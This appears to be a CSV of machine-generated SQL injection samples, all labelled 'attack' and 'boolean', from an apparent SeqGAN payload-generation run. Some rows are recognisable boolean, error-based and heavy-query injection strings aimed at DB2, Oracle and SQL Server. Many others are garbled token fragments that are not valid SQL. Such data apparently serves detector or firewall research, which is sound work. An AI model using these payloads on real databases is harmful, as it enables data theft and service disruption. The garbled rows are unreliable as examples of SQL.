label,payload,family,payload_type,method,run_id,sample_index
attack,"1%' 3455  =     _uppa,pechar  (  (  =  io 6671upex  (  2961  )  =  =  =  =  =  and _--",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,302
attack,"o  ,rdbgerib$rs 2961  s al_iblt  (  (  _us apeecol_is or t3  hrl_uosesystreft_ublmabreregt  =  =    =  s char  2774  =  8459  repe andus 3580expyp  (  = 'cgou' 6849  =  =  )  =  cb$fkes ap_ibmastabombleibmmab  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,303
attack,"-8919%my'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,304
attack,1   )    )    ,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,305
attack,"1%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,306
attack,"1%""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,307
attack,1 a' or ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,308
attack,"1 whereyp_8691  6388  =    (  =  (  (  *  =  =  =  =  =    (  =  (  =  6388  (char  =4 7793  =  6849  select cins asibefingeppe_usibm.ft_us t2,aint  (  =  =  (    =    )  =  4018  =  = 3862  = where 3580  (  =  (  (  =    L  (  =  =  (  =  =  1087  upt  (  3455 3880  =",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,309
attack,"1""  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  ""1z where 2649 (  (  i$coble",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,310
attack,"1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'wLzb' like 'mx   )   ag,r' like 'mt  (  111  )  rsypefkeril_ksimd,abll_us t4,s v_ustab$finiblint  (  (  L  )  =  (  =  =  convertncte or 5485 _pt 1570  =  (  =   _xpexpp_lleg,in.serpt_tapeci2774ubmas as t3(   udedb",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,311
attack,"1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,312
attack,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,313
attack,"1""   )    or   from s atab$fis aintj t4t  (  (  lef fs and columa.'  =  'aill_un.sers tr2--",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,314
attack,"1"" or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,315
attack,-1%'%_hl  =  =    (  from x_,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,316
attack,1'   where or  =  =  2774(=  =  =,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,317
attack,"1%""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,318
attack,"1%""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,319
attack,1   )    )    =    fupdouns as where*inpe--,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,320
attack,"select crrere't    =  select char  (   (  =  select char  (  +char  (  )  *  7555  =    (  =eor  =  =  =  =  (/p_(  =  =  =  2027xingeqpg  (  (  0x7171706a71,  (  =  rex  =  = char  from  =   (  (    =  =   ' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'erepioll_userainalusddibli    my4906",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,321
attack,"1y' from dual where 6433  =  6433 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,322
attack,"-8919wn' where 4912  =  4912 or 6979  =  like  (  '' like 's where 3862  (  ,  (  =  =  ,x  =  (  =  =L  (  =  (  6849  =     )    =  =  = char  =  =    (  select coub4t  (  ' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,323
attack,"-8327ybghex  rerh_ydolbmtchar  r =   (  (  )  =  (  =  113  1087  =  xp9643  =  (  =  =  3880 char  =  =  =  iinwgnwzt4,donses and--",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,324
attack,"1%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,325
attack,-imy,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,326
attack,1  rtrrb$rq  ||realieteate2   (  =p_=p_udbje and t  =  (    =    (  =  up_t  rrightinypztr t4  =  if whenypes 9643 char  =  =    (  =  =  8571 7555  =  122  2774  =  1570expcnxp   3880 2724   (  =  =  (  9198 2961 5286  =  2027  (  =  =  =    (  (  2774  =  ,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,327
attack,1%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,328
attack,"1""  rt2,pegzatdount  =  1087 B 3880  (  *pdoll_k   aint4,aiomas 1661",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,329
attack,"1%')    a,s  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,330
attack,  99,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,331
attack,"4   )    where 3880  (  =  =  *  6849 and 7417 5286 char  ckdossystat3,al_us where 1087=  (  3352  =  =  =  =  2180 4  =  = where 4018 coluntds t(  (  (  (   2180  *  =  s or as 9643 couo' or 'as rs ain"" like ""eg t5  )  (  =    (  * 3880  =  (  112  =  erechar  =  =  (  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,332
attack,"1'+  (  select 'dl_""  )   or   (  ""_l   )    rexp_up_k    e",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,333
attack,1 abm'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,334
attack,1   )    )     )     )  2027 or 7417  (  4018  (  =p_s   from where where 8446744073709551610  =    =    select or int  =  (  =    =    (  3352 from j  (    =  (  rex  =  2774 where  =    5485  = 7793  =  =  =    =  (  (  =  =   (    (   char  =  *  =  = 3455  (  *  =  =  80 7417 2649  (  =  =  =   (  =  =    (  =  =  Lp  = or,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,335
attack,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,336
attack,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,337
attack,1 where a(  2961  (    (  =  =  3862  (   dIt  )   from where s and    =  =  =  (     =  =  6849   7417   =  =_upcomastrt3  =  ||char  69  =  =  = or or like 6388  =  119  =  (  (  2961  (  4018  113  = 9643  (  2774 orer  =  =  char  =  rdbstrin.trireginstt_sz.s at1yst,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,338
attack,"-1617%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,339
attack,1%7185%,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,340
attack,1   ) or where char  =      (  7522  he=  7522  =  qcxuolonunt  L  =  * where  79  =  (  1570  88 7793  =    (  ri,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,341
attack,"1'  =  'z where aioomaintas t2,dong  = char  (  1570  (  ||char  =  0x7171706a71,r  =  les aint  =  e(  =  select or 2180 a/xp_g domaimas rs t3  )  indobll'  =  's t1,ain.ain.cll(   =  or)     )   'unusual'",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,342
attack,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,343
attack,1' in boolean mode  )   or 6979  =  like  (  'ab/'  =  'ds as as tzt or acrininys t3  =  (    (  =    =  (  or3352 at  (  =  8691    (  (  orapes  2961    (  =  (  *  =    =   2961  =  where 3880  =  =  4799erhs credepexp_s t4 or =    =  3455  =  =  4018  (  2724  =  select   (  *hchar  i' or char  (  3880  =  =  =  ,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,344
attack,1%%,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,345
attack,"1' htr  )  css arreft2ataingipel_kublus sibun.staales asystaiell_useinibm' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,346
attack,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,347
attack,1%%,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,348
attack,"1'   )    )     )   and   (  1685  =  2985  )  *2985 and    (    (     (  ' where where or or 7793 8691  =  3580 8446744073709551610  =  =  (  (  (  convert 2774 =  select concat  (eah_s 8446744073709551610,dobltaldoundilain.pechar  =e3455  y  (  =  =  2642 or and   4  lus t4us or   ( then when  )  )    rep_t_kagup_flsusts omasNiss   rint,at  =  =  =     (  =  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,349
attack,1' where *ex or c al_s as ables a--l_uss ds where 1087  (     or or 2027  (  =  =  =  uppqc_s t a  =  r or and or 6388 and    ( where f where 3880  (  = or 1087  =  =  =  69  rt  (  =  6093  =  georr  (  3352 3393 ape2724 where 'unusual' where 3880  =    =  8691  =    (  4018 and 5485,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,350
attack,"1 orint  =  (  105  =  =   when ap_e5000000001u2 or  whereand 2961  =  (  rsri_upss t1s aint  (  1087  =  ,xp_upts where cupin.ss tysystabrib$t  =  aep_dbmas t2tins as ableg char  select 7793  =  3862  =     (  =  =    (  (  =  6671  (  (p_=",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,351
attack,,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,352
attack,"1%      )    aldb$fiolabstaimr_s ain.sin.stabl_us t2,dbl_synrdildom.in.amat  ibbll_un t2649ibcveft  (p_up_usysysinsss tzs at antj t1blncomancolais tl_kuomabllatit  (  =  = ain",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,353
attack,"1 wheres councel_ubmald,rs tal_ss t t1,redb$fys ins t2,as ts t1,erible 2180 2774 'unusual'hat_kexpeleppertrdtas t3  (  8403/2   )   7417  =  113  =  (  (    =  (  2027  (  =  3880  =  =  2961  =  iinghdht_usubstres 8446744073709551610ous",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,354
attack,"%' or 8384  =  like  (  'as where oris t4ta_kpptex  (  =  (  2774   (  aiolzmbmatr' dbmy' from dual where 6433  =  6433 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,355
attack,"1%'   )   or 3393 3455   ( or 2961  =  =   (  119  =  (  from t2,nt_,0x78   from t2,aint  =  7555 2642 char  =  = 5556  2961edp_s as adsipt4,ass rdb$cobft  (  48  =    (  (  as t2pe,ing =  4018  (  4799   2027 or  =  (  *  =  (  =  (  =  = select like 3880 or  (  =",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,356
attack,"1'   )      and   8571  )   ribl_fint  (  =    =  1087  rrdoung  lexp_bles apclamaesibss astas t3,ajengt_ adpstcynclup_keftrep_ up_s ar  =  4799 and   =  (  5485ex  (  49  =  (  =  ,_dol_uses asyss where acexp_ud",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,357
attack,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,358
attack,"1""   end   )   4018 or 7522  =  =  =  or _s tapdomas trs asktabl_ing  rep_upelesiomaltab$t  =  2649  =    3352  =  select 1668  4018  = 6093 concat  ree_t  =  =  =  (   2774 aip_s ristas t2,zb$fexpeft  (    2774  =  =  =  =  =  5485  =    (  =  =  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,359
attack,"1%%""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%v'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,360
